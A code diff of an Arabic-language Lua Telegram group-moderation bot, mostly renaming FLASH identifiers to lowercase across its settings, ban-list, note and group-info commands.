+if flashdx1:get(flash.."kaf"..msg.chat_id_) then mute_kaf = 'مفعل ✔️' else mute_kaf = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:muteall'..msg.chat_id_) then mute_all = 'مفعل ✔️' else mute_all = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:text:mute'..msg.chat_id_) then mute_text = 'مفعل ✔️' else mute_text = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مفعل ✔️' else mute_photo = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:video:mute'..msg.chat_id_) then mute_video = 'مفعل ✔️' else mute_video = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مفعل ✔️' else mute_gifs = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then mute_flood = 'مفعل ✔️' else mute_flood = 'معطل ✖️' end
+------------flash
+if not flashdx1:get(flash..'flood:max:'..msg.chat_id_) then
 flood_m = 5 else
-flood_m = FLASHdx1:get(FLASH..'flood:max:'..msg.chat_id_) end
-------------FLASH
-if not FLASHdx1:get(FLASH..'bot:sens:spam'..msg.chat_id_) then
+flood_m = flashdx1:get(flash..'flood:max:'..msg.chat_id_) end
+------------flash
+if not flashdx1:get(flash..'bot:sens:spam'..msg.chat_id_) then
 spam_c = 250 else
-spam_c = FLASHdx1:get(FLASH..'bot:sens:spam'..msg.chat_id_) end
-------------FLASH
-if FLASHdx1:get(FLASH..'floodstatus'..msg.chat_id_) == "DelMsg" then
+spam_c = flashdx1:get(flash..'bot:sens:spam'..msg.chat_id_) end
+------------flash
+if flashdx1:get(flash..'floodstatus'..msg.chat_id_) == "DelMsg" then
 floodstatus = "بالمسح"
-elseif FLASHdx1:get(FLASH..'floodstatus'..msg.chat_id_) == "Kicked" then
+elseif flashdx1:get(flash..'floodstatus'..msg.chat_id_) == "Kicked" then
 floodstatus = "بالطرد"
-elseif not FLASHdx1:get(FLASH..'floodstatus'..msg.chat_id_) then
+elseif not flashdx1:get(flash..'floodstatus'..msg.chat_id_) then
 floodstatus = "بالمسح" end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:music:mute'..msg.chat_id_) then mute_music = 'مفعل ✔️' else mute_music = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:bots:ban'..msg.chat_id_) then mute_bots = 'مفعل ✔️' else mute_bots = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مفعل ✔️' else mute_in = 'معطل ✖️' end
-------------FLASH 
-if FLASHdx1:get(FLASH..'bot:cmds'..msg.chat_id_) then mute_cmd = 'مفعل ✔️' else mute_cmd = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مفعل ✔️' else mute_voice = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'editmsg'..msg.chat_id_) then mute_edit = 'مفعل ✔️' else mute_edit = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then mute_links = 'مفعل ✔️' else mute_links = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مفعل ✔️' else lock_pin = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مفعل ✔️' else lock_sticker = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مفعل ✔️' else lock_tgservice = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مفعل ✔️' else lock_wp = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:strict'..msg.chat_id_) then strict = 'مفعل ✔️' else strict = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then lock_htag = 'مفعل ✔️' else lock_htag = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then lock_tag = 'مفعل ✔️' else lock_tag = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:location:mute'..msg.chat_id_) then lock_location = 'مفعل ✔️' else lock_location = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مفعل ✔️' else lock_contact = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then lock_english = 'مفعل ✔️' else lock_english = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:music:mute'..msg.chat_id_) then mute_music = 'مفعل ✔️' else mute_music = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:bots:ban'..msg.chat_id_) then mute_bots = 'مفعل ✔️' else mute_bots = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مفعل ✔️' else mute_in = 'معطل ✖️' end
+------------flash 
+if flashdx1:get(flash..'bot:cmds'..msg.chat_id_) then mute_cmd = 'مفعل ✔️' else mute_cmd = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مفعل ✔️' else mute_voice = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'editmsg'..msg.chat_id_) then mute_edit = 'مفعل ✔️' else mute_edit = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then mute_links = 'مفعل ✔️' else mute_links = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مفعل ✔️' else lock_pin = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مفعل ✔️' else lock_sticker = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مفعل ✔️' else lock_tgservice = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مفعل ✔️' else lock_wp = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:strict'..msg.chat_id_) then strict = 'مفعل ✔️' else strict = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then lock_htag = 'مفعل ✔️' else lock_htag = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then lock_tag = 'مفعل ✔️' else lock_tag = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:location:mute'..msg.chat_id_) then lock_location = 'مفعل ✔️' else lock_location = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مفعل ✔️' else lock_contact = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then lock_english = 'مفعل ✔️' else lock_english = 'معطل ✖️' end
 ------------fader
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مفعل ✔️' else lock_arabic = 'معطل ✖️' end
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مفعل ✔️' else lock_arabic = 'معطل ✖️' end
 ------------fader
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مفعل ✔️' else lock_forward = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:document:mute'..msg.chat_id_) then lock_file = 'مفعل ✔️' else lock_file = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'markdown:lock'..msg.chat_id_) then markdown = 'مفعل ✔️' else markdown = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مفعل ✔️' else lock_spam = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH.."bot:welcome"..msg.chat_id_) then send_welcome = 'مفعل ✔️' else send_welcome = 'معطل ✖️' end
-------------FLASH
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مفعل ✔️' else lock_forward = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:document:mute'..msg.chat_id_) then lock_file = 'مفعل ✔️' else lock_file = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'markdown:lock'..msg.chat_id_) then markdown = 'مفعل ✔️' else markdown = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مفعل ✔️' else lock_spam = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash.."bot:welcome"..msg.chat_id_) then send_welcome = 'مفعل ✔️' else send_welcome = 'معطل ✖️' end
+------------flash
 local TXTAR = "❅∫ اعدادات المجموعه 🔻 :\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 .."❅∫ قفل الحمايه ، "..strict.."\n"
 .."❅∫ قفل الكل ، "..mute_all.."\n"
@@ -8362,69 +8362,69 @@ local TXTAR = "❅∫ اعدادات المجموعه 🔻 :\n         • ┉ �
 .."❅∫ عدد التكرار ، [ "..flood_m.." ]\n"
 .."️❅∫ عدد السبام ، [ "..spam_c.." ]\n"
 .."         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ [𝐅𝐀𝐄𝐃𝐄𝐑 - 𝐂𝐇](https://t.me/FAQY4)\n"
-FLASHdx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
 end end 
---     By Developer FLASH     --
+--     By Developer flash     --
 if text and text:match("^كول (.*)$")  then
 local txt = {string.match(text, "^(كول) (.*)$")}
-FLASHdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
+flashdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 end
---     By Developer FLASH     -- 
-if (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل ردود البوت سابقا ', 1, 'md')
+--     By Developer flash     -- 
+if (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل ردود البوت سابقا ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل ردود البوت ', 1, 'md')
-FLASHdx1:del(FLASH..'bot:rep:mute'..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل ردود البوت ', 1, 'md')
+flashdx1:del(flash..'bot:rep:mute'..msg.chat_id_)
 end end
-if (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل ردود البوت سابقا ', 1, 'md')
+if (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل ردود البوت سابقا ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل ردود البوت ', 1, 'md')
-FLASHdx1:set(FLASH..'bot:rep:mute'..msg.chat_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل ردود البوت ', 1, 'md')
+flashdx1:set(flash..'bot:rep:mute'..msg.chat_id_,true)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
 local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
-FLASHdx1:set(FLASH..'owner:note1', txt[2])
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها ', 1, 'md')
+flashdx1:set(flash..'owner:note1', txt[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها ', 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^جلب الملاحظه$") and is_leader(msg) then
-local note = FLASHdx1:get(FLASH..'owner:note1')
-FLASHdx(msg.chat_id_, msg.id_, 1, note, 1, nil)
+local note = flashdx1:get(flash..'owner:note1')
+flashdx(msg.chat_id_, msg.id_, 1, note, 1, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^الروابط$") and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if text and text:match("^الروابط$") and flash11(msg) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 mute_links = 'مقفوله 🌟'
 else
 mute_links = 'معطل 🛢'
 end
-local FLASH = "🎖┋ اعدادات الروابط 🔻 :\n\n"
+local flash = "🎖┋ اعدادات الروابط 🔻 :\n\n"
 .." الروابط : "..mute_links.."\n"
-FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
 local txt = {string.match(text, "^(ضع اسم) (.*)$")}
 changetitle(msg.chat_id_, txt[2])
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تغيير اسم المجموعه ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تغيير اسم المجموعه ', 1, 'md')
 end
---     By Developer FLASH     -- 
-if text and text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي الصوره الان ، ', 1, 'md')
-FLASHdx1:set(FLASH..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
+--     By Developer flash     -- 
+if text and text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي الصوره الان ، ', 1, 'md')
+flashdx1:set(flash..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match('^المجموعات$') then
-local list = FLASHdx1:smembers(FLASH.."bot:groups")
+local list = flashdx1:smembers(flash.."bot:groups")
 local t = "❅∫ مجموعات البوت ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
 t = t..k.." - {`"..v.."`}\n" 
@@ -8432,22 +8432,22 @@ end
 if #list == 0 then
 t = '❅∫ لا يوجد مجموعات مفعله '
 end
-FLASHdx(msg.chat_id_, msg.id_, 1,t, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,t, 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
 unpinmsg(msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء تثبيت الرساله ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء تثبيت الرساله ', 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
-local pin_id = FLASHdx1:get(FLASH..'pinnedmsg'..msg.chat_id_)
+local pin_id = flashdx1:get(flash..'pinnedmsg'..msg.chat_id_)
 if pin_id then
 pin(msg.chat_id_,pin_id,0)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم اعاده تثبيت الرساله ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم اعاده تثبيت الرساله ', 1, 'md')
 else end end       
---     By Developer FLASH     -- 
-if text and text:match("^طرد الحسابات المحذوفه$") and FLASH11(msg) or text and text:match("^طرد المحذوف$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^طرد الحسابات المحذوفه$") and flash11(msg) or text and text:match("^طرد المحذوف$") and flash11(msg) then
 local function deleteaccounts(extra, result)
 for k,v in pairs(result.members_) do 
 local function cleanaccounts(extra, result)
@@ -8456,73 +8456,73 @@ changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
 end end
 getUser(v.user_id_, cleanaccounts, nil)
 end 
-FLASHdx(msg.chat_id_, msg.id_, 0,'❅∫ تم طرد الحسابات المحذوفه ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 0,'❅∫ تم طرد الحسابات المحذوفه ', 1, 'md')
 end 
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
 end
---     By Developer FLASH     -- 
-if text and text:match("^تنظيف قائمه الحظر$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^تنظيف قائمه الحظر$") and flash11(msg) then
 local function removeblocklist(extra, result)
 if tonumber(result.total_count_) == 0 then 
-FLASHdx(msg.chat_id_, msg.id_, 0,'❅∫ لا يوجد محظورين ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 0,'❅∫ لا يوجد محظورين ', 1, 'md')
 else
 local x = 0
 for x,y in pairs(result.members_) do
 changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
 x = x + 1
 end 
-FLASHdx(msg.chat_id_, msg.id_, 0,'❅∫ تم تنظيف قائمه حظر الجروب ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 0,'❅∫ تم تنظيف قائمه حظر الجروب ', 1, 'md')
 end
 end
 getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
 end
---     By Developer FLASH     -- 
-if text and text:match("^مسح المحظورين$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^مسح المحظورين$") and flash11(msg) then
 local function removeblocklist(extra, result)
 if tonumber(result.total_count_) == 0 then 
-FLASHdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
 else
 local x = 0
 for x,y in pairs(result.members_) do
 changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
 x = x + 1
 end 
-FLASHdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
 end end
 getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
 end 
---     By Developer FLASH     -- 
-if text and text:match("^معلومات المجموعه$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^معلومات المجموعه$") and flash11(msg) then
 function gpinfo(arg,data)
 -- vardump(data) 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ايدي المجموعة » ( '..msg.chat_id_..' )\n❅∫ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n❅∫ عدد المحظورين » ( *'..data.kicked_count_..' )*\n❅∫ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ايدي المجموعة » ( '..msg.chat_id_..' )\n❅∫ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n❅∫ عدد المحظورين » ( *'..data.kicked_count_..' )*\n❅∫ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 1, 'md') 
 end 
 getChannelFull(msg.chat_id_, gpinfo, nil) 
 end 
-if text and text:match('^كشف (-%d+)') and FLASH11(msg) then
+if text and text:match('^كشف (-%d+)') and flash11(msg) then
 local chattid = text:match('كشف (-%d+)') 
 if not is_admin(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
 else
-function FLASH_re(arg,data)
-function FLASH(f1,f2)
-function FLASH333(t1,t2)
-local list = FLASHdx1:smembers(FLASH.."bot:monsh:" .. chattid)
+function flash_re(arg,data)
+function flash(f1,f2)
+function flash333(t1,t2)
+local list = flashdx1:smembers(flash.."bot:monsh:" .. chattid)
 if list[1] or list[2] or list[3] or list[4] then
-user_info = FLASHdx1:get(FLASH.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
+user_info = flashdx1:get(flash.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
 end
 if user_info then
 monsh = user_info
 else
 monsh = "لا يوجد"
 end
-local Monsh = FLASHdx1:scard(FLASH.."bot:monsh:" .. chattid) or "0"
-local Baned = FLASHdx1:scard(FLASH.."bot:banned:" .. chattid) or "0"
-local Owner = FLASHdx1:scard(FLASH.."bot:owners:" .. chattid) or "0"
-local Muted = FLASHdx1:scard(FLASH.."bot:muted:" .. chattid) or "0"
-local Tkeed = FLASHdx1:scard(FLASH.."bot:keed:" .. chattid) or "0"
-local Momod = FLASHdx1:scard(FLASH.."bot:momod:" .. chattid) or "0"
-local Vip = FLASHdx1:scard(FLASH.."bot:vipmem:" .. chattid) or "0"
+local Monsh = flashdx1:scard(flash.."bot:monsh:" .. chattid) or "0"
+local Baned = flashdx1:scard(flash.."bot:banned:" .. chattid) or "0"
+local Owner = flashdx1:scard(flash.."bot:owners:" .. chattid) or "0"
+local Muted = flashdx1:scard(flash.."bot:muted:" .. chattid) or "0"
+local Tkeed = flashdx1:scard(flash.."bot:keed:" .. chattid) or "0"
+local Momod = flashdx1:scard(flash.."bot:momod:" .. chattid) or "0"
+local Vip = flashdx1:scard(flash.."bot:vipmem:" .. chattid) or "0"
 if t2.invite_link_ == false then 
 local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
 local req = https.request(getlink)
@@ -8530,143 +8530,143 @@ local link = json:decode(req)
 if link.ok == true then 
   t2.invite_link_ = link.result
 end end
-FLASHdx1:set(FLASH.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@FAQY4")) 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ المنشئ ⌯» ["..monsh.."]\n\n❅∫ الرابط ، ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/FAQY4")..")\n❅∫ ايديها ⌯» *"..msg.chat_id_.."*\n❅∫ عدد الاعضاء ⌯» *"..data.member_count_.."* \n❅∫ عدد المدراء ⌯» *"..Owner.."*\n❅∫ عدد المنشئين ⌯» *"..Monsh.."*\n❅∫ عدد الادمنيه ⌯» *"..Momod.."*\n❅∫ عدد المكتومين ⌯» *"..Muted.."*\n❅∫ عدد المحظورين ⌯» *"..Baned.."*\n❅∫ عدد المقيدين ⌯» *"..Tkeed.."*\n❅∫ عدد المميزين ⌯» *"..Vip.."*\n", 1,"md")
+flashdx1:set(flash.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@FAQY4")) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ المنشئ ⌯» ["..monsh.."]\n\n❅∫ الرابط ، ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/FAQY4")..")\n❅∫ ايديها ⌯» *"..msg.chat_id_.."*\n❅∫ عدد الاعضاء ⌯» *"..data.member_count_.."* \n❅∫ عدد المدراء ⌯» *"..Owner.."*\n❅∫ عدد المنشئين ⌯» *"..Monsh.."*\n❅∫ عدد الادمنيه ⌯» *"..Momod.."*\n❅∫ عدد المكتومين ⌯» *"..Muted.."*\n❅∫ عدد المحظورين ⌯» *"..Baned.."*\n❅∫ عدد المقيدين ⌯» *"..Tkeed.."*\n❅∫ عدد المميزين ⌯» *"..Vip.."*\n", 1,"md")
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(chattid).ID
-}, FLASH333, nil)
+}, flash333, nil)
 end
-openChat(msg.chat_id_,FLASH) 
+openChat(msg.chat_id_,flash) 
 end
-getChannelFull(chattid, FLASH_re, nil)
+getChannelFull(chattid, flash_re, nil)
 end end 
---     By Developer FLASH     -- 
-if text and text:match("^غادر (-%d+)$")  and FLASH11(msg) then
-if not FLASHdx1:get(FLASH..'lock:add'..msg.chat_id_) then
+--     By Developer flash     -- 
+if text and text:match("^غادر (-%d+)$")  and flash11(msg) then
+if not flashdx1:get(flash..'lock:add'..msg.chat_id_) then
 local txt = { string.match(text, "^(غادر) (-%d+)$")}
 if not is_sudo(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
 else 
 local leavegp = function(extra, result)
 if result.id_ then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ المجموعه ⌯» {" .. result.title_ .. "}\n❅∫ تمت المغادره منها بامر المطور ", 1, "md")
-FLASHdx(txt[2], 0, 1, '❅∫ بامر من المطور تم مغادره المجموعه\n❅∫ لاستعاده البوت راسل المطور ادناه \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n [❅∫ مطور البوت ](t.me/'..SudoFLASH..')', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ المجموعه ⌯» {" .. result.title_ .. "}\n❅∫ تمت المغادره منها بامر المطور ", 1, "md")
+flashdx(txt[2], 0, 1, '❅∫ بامر من المطور تم مغادره المجموعه\n❅∫ لاستعاده البوت راسل المطور ادناه \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n [❅∫ مطور البوت ](t.me/'..Sudoflash..')', 1, 'md') 
 chat_leave(result.id_, bot_id)
-FLASHdx1:srem(FLASH.."bot:groups", result.id_)
+flashdx1:srem(flash.."bot:groups", result.id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لم تتم اضافتي فيها لاقوم بمغادرتها ", 1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لم تتم اضافتي فيها لاقوم بمغادرتها ", 1, "md")
 end end 
 getChat(txt[2], leavegp) 
 end end end 
---     By Developer FLASH     -- 
-if text == 'تفعيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..' \n❅∫ تم تفعيل منو ضافني'
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
-FLASHdx1:del(FLASH..'Added:Me'..msg.chat_id_) 
+--     By Developer flash     -- 
+if text == 'تفعيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..' \n❅∫ تم تفعيل منو ضافني'
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:del(flash..'Added:Me'..msg.chat_id_) 
 end
-if text == 'تعطيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..' \n❅∫ تم تعطيل منو ضافني'
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
-FLASHdx1:set(FLASH..'Added:Me'..msg.chat_id_,true)  
+if text == 'تعطيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..' \n❅∫ تم تعطيل منو ضافني'
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:set(flash..'Added:Me'..msg.chat_id_,true)  
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'تفعيل البوت الخدمي' then 
-local  FLASH = '❅∫ تم تفعيل البوت الخدمي ' 
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
-FLASHdx1:del(FLASH..'lock:bot:free'..bot_id) 
+local  flash = '❅∫ تم تفعيل البوت الخدمي ' 
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:del(flash..'lock:bot:free'..bot_id) 
 end
 if text == 'تعطيل البوت الخدمي' then 
-FLASH = '❅∫ تم تعطيل البوت الخدمي ' 
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
